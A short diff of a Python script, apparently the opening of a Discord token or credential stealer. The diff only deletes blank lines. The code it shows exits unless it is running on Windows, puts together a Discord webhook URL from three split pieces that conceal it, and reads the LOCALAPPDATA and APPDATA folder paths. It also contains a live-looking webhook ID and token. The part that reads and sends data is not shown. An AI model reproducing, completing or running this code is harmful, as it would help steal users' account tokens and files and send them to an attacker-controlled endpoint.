@@ -1,9 +1,7 @@
 import os
 
-
 if os.name != "nt":
     exit()
-
 
 import json
 from urllib import request, urlopen
@@ -13,14 +11,11 @@ from subprocess import Popen, PIPE
 from threading import Thread
 from sys import argv
 
-
 one="https://discord.com/api/webhooks/"
 two="925773749989539880/"
 three="LEv63vv4yQNh05ghC3bZytPUPywS5h0JdfjTx82h58cPW-sssXsDoPnDRPMyTcznpALY"
 
-
 WEBHOOK_URL = one + two + three
-
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
